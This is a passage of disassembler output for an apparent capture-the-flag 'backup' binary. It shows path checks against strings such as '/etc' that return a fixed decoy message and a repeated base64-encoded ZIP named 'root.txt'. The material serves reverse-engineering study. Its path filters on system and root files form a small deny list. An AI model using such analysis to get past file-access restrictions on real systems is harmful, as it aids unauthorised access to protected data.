QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x08049055      e836f6ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x0804905a      83c410         add esp, 0x10
|       |   0x0804905d      83ec0c         sub esp, 0xc
|       |   0x08049060      6a00           push 0
|       |   0x08049062      e859f6ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x0804903b (sym.main)
|       `-> 0x08049067      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x0804906a      83c00c         add eax, 0xc
|           0x0804906d      8b00           mov eax, dword [eax]
|           0x0804906f      83ec08         sub esp, 8
|           0x08049072      68cb9e0408     push 0x8049ecb
|           0x08049077      50             push eax
|           0x08049078      e863f5ffff     call sym.imp.strstr         ; char*strstr(char *s1, const char *s2)
|           0x0804907d      83c410         add esp, 0x10
|           0x08049080      85c0           test eax, eax
|       ,=< 0x08049082      742a           je 0x80490ae
|       |   0x08049084      83ec0c         sub esp, 0xc
|       |   0x08049087      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x0804908c      e8eef8ffff     call sym.displaySuccess
|       |   0x08049091      83c410         add esp, 0x10
|       |   0x08049094      83ec0c         sub esp, 0xc
|       |   0x08049097      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x0804909c      e8eff5ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x080490a1      83c410         add esp, 0x10
|       |   0x080490a4      83ec0c         sub esp, 0xc
|       |   0x080490a7      6a00           push 0
|       |   0x080490a9      e812f6ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08049082 (sym.main)
|       `-> 0x080490ae      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x080490b1      83c00c         add eax, 0xc
|           0x080490b4      8b00           mov eax, dword [eax]
|           0x080490b6      83ec08         sub esp, 8
|           0x080490b9      68ce9e0408     push 0x8049ece
|           0x080490be      50             push eax
|           0x080490bf      e82cf5ffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|           0x080490c4      83c410         add esp, 0x10
|           0x080490c7      85c0           test eax, eax
|       ,=< 0x080490c9      752a           jne 0x80490f5
|       |   0x080490cb      83ec0c         sub esp, 0xc
|       |   0x080490ce      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x080490d3      e8a7f8ffff     call sym.displaySuccess
|       |   0x080490d8      83c410         add esp, 0x10
|       |   0x080490db      83ec0c         sub esp, 0xc
|       |   0x080490de      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x080490e3      e8a8f5ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x080490e8      83c410         add esp, 0x10
|       |   0x080490eb      83ec0c         sub esp, 0xc
|       |   0x080490ee      6a00           push 0
|       |   0x080490f0      e8cbf5ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x080490c9 (sym.main)
|       `-> 0x080490f5      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x080490f8      83c00c         add eax, 0xc
|           0x080490fb      8b00           mov eax, dword [eax]
|           0x080490fd      83ec08         sub esp, 8
|           0x08049100      68d09e0408     push str.etc                ; 0x8049ed0 ; "/etc"
|           0x08049105      50             push eax
|           0x08049106      e8d5f4ffff     call sym.imp.strstr         ; char*strstr(char *s1, const char *s2)
|           0x0804910b      83c410         add esp, 0x10
|           0x0804910e      85c0           test eax, eax
|       ,=< 0x08049110      742a           je 0x804913c
|       |   0x08049112      83ec0c         sub esp, 0xc
|       |   0x08049115      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x0804911a      e860f8ffff     call sym.displaySuccess
|       |   0x0804911f      83c410         add esp, 0x10
|       |   0x08049122      83ec0c         sub esp, 0xc
|       |   0x08049125      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9